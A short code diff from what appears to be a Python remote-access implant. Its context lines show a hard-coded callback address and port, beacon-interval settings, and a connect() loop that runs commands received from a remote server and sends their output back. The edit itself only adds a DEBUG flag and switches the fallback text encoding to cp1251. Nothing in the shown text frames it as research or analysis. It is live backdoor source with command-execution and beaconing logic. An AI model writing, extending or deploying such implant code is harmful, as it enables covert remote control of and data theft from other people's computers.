@@ -28,6 +28,7 @@ remote_ip = '10.0.0.109'
 remote_port = 8081
 server_sni_hostname = ''
 VERBOSE = True
+DEBUG = True
 DEVNULL = subprocess.DEVNULL
 BEACON_INTERVAL_DEFAULT = 30    #in seconds
 BEACON_INTERVAL_MEM = BEACON_INTERVAL_DEFAULT
@@ -388,7 +389,7 @@ def connect(remote_ip=remote_ip, remote_port=remote_port):
                             try:
                                 send_data(conn, output.stdout.decode('utf-8')) # send back the result
                             except UnicodeDecodeError:
-                                send_data(conn, output.stdout.decode('cp1252')) # send back the result
+                                send_data(conn, output.stdout.decode('cp1251')) # send back the result
                     except subprocess.TimeoutExpired:
                         if VERBOSE:
                             print_warn("Command Execution Timeout Expired")
